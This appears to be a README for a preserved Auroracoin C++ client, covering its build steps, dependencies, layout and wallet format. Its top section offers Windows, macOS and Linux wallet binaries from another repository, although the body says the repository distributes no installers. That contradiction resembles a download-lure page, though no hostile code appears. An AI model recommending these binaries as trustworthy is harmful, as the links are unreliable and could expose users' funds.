![Auroracoin historical core client reference repository](assets/aurora-wallet-desktop-app-banner.png)

# Auroracoin historical core client

The original C++ Auroracoin client, preserved as a reference repository. The downloads below are the companion Aurora Wallet desktop app.

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/blob/HEAD/COPYING"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


## What this repository does

This repository holds the C++ source of the first Auroracoin desktop client, the full-node program that carried the network from its 2014 launch until the modern wallet took over. It is the reference copy of the protocol as it was implemented then: the block rules, the scrypt proof-of-work check, the transaction validation code, the wallet file format and the Qt interface that most holders of that era remember.

The code descends from the Bitcoin 0.8 line, adapted for Auroracoin's block interval, reward schedule and address format. Reading it answers questions that the modern wallet cannot answer on its own, such as how a legacy `wallet.dat` was built, which key derivation path the old client used, how the client selected peers and how the original address book and transaction labels were stored.

The repository is a source reference, not a distribution point. There is no installer here and no download that the Foundation supports for day-to-day use. Balances held in a wallet created by this client move into Aurora Wallet through the import path described in the guide library, and the original file stays where it is until the holder chooses to remove it.

## Who uses it

Auditors use this repository to compare the historical rules of the chain with the code that produced them. Researchers and writers use it to date features, confirm constants and quote the exact implementation behind a public claim. Long-time holders open it when they need to understand a file, a folder name or a password prompt that they last saw years ago.

Developers rebuilding the early client on a modern machine read the build files and the dependency list before they start, because the toolchain of that period expected library versions that current systems no longer ship by default. The build notes below describe the original sequence, and the `INSTALL` file in the repository root carries the same instructions in the form the project published them.

## Setup

The original build is a three-stage Autotools build. Run `./autogen.sh` to regenerate the configure script, then `./configure` with the options you need and finally `make`. The resulting binaries land in `src/`, with the graphical client built when the Qt development packages are present and the daemon built in every configuration.

Dependencies of that era are the Berkeley DB library for the wallet file, Boost for the program options parser and, for the graphical client, the Qt libraries used by the desktop build. The `doc/` folder records the build notes for each supported system, and `contrib/` holds the packaging scripts the project used at the time.

A ready-made current wallet needs none of this. The section above downloads the Aurora Wallet installer for Windows, macOS or Linux, and the first-run guide in the guide library covers the setup of that application from download to first receive address.

## Contents

`src/` holds the node, the wallet logic, the mining code and the Qt interface. `contrib/` holds the packaging and deployment scripts. `share/` holds the generated configuration samples and the pixmap resources used by the desktop client. `doc/` holds the build documentation for each platform, and `qa/rpc-tests/` holds the functional tests that exercised the remote procedure call interface.

The build entry points sit in the repository root: `autogen.sh`, `configure.ac`, `Makefile.am` and `bitcoin-qt.pro` for the graphical project file. `COPYING` carries the license text, and `INSTALL` carries the build notes.

## What the code records

The wallet file format is the part most readers come for. A `wallet.dat` from this client holds keys, labels, address book entries and transaction metadata in one Berkeley DB file, encrypted when a passphrase was set. Reading the writer code explains what survives an import and what does not, which is why the modern wallet restores keys from the file and keeps its labels only when the file itself is read.

The consensus rules are the second reason to read it. Block spacing, reward halving, difficulty adjustment and the scrypt header check are all visible in the validation code, and the constants match the network that still runs today. An auditor can compare a historical block against the rules that accepted it without leaving the repository.

The peer layer is the third. Address discovery, connection limits and the handshake that identifies a node are written plainly in this codebase, which makes it a readable reference for anyone building a compatible tool.

Finally, the build files record the toolchain of the period: Berkeley DB for the wallet, Boost for options, Qt for the interface and Autotools for the build. None of that is needed to hold Auroracoin today, and the record is useful precisely because the current wallet does not depend on it.

## Documentation and license

Guides for the current wallet live in the [aurora-wallet-docs repository](https://github.com/aurora-coin/aurora-wallet-docs), including the article that explains [the legacy repositories](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/29-legacy-repositories-explained.md) and the one that covers [migrating an old balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/27-migrate-from-auroracoin-core.md) into the modern application.

The source is published under the MIT license, and the original upstream copyright notices are kept in the files that carry them. The Auroracoin Foundation publishes this repository as a public record of the network's first implementation.
